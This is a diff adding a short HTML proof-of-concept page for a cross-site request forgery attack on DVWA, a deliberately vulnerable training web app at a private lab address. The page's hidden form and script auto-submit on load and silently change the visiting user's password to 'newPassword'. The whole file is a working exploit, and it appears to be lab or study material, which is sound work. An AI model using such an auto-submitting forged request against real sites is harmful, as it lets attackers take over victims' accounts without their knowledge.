@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Low CSRF PoC</title>
+</head>
+<body>
+    <h1>Low CSRF PoC</h1>
+    <form id="csrfForm" action="http://192.168.50.143/dvwa/vulnerabilities/csrf/" method="GET">
+        <input type="hidden" name="password_new" value="newPassword">
+        <input type="hidden" name="password_conf" value="newPassword">
+        <input type="hidden" name="Change" value="Change">
+    </form>
+    <script>
+        // 自动提交表单
+        document.getElementById('csrfForm').submit();
+    </script>
+</body>
+</html>
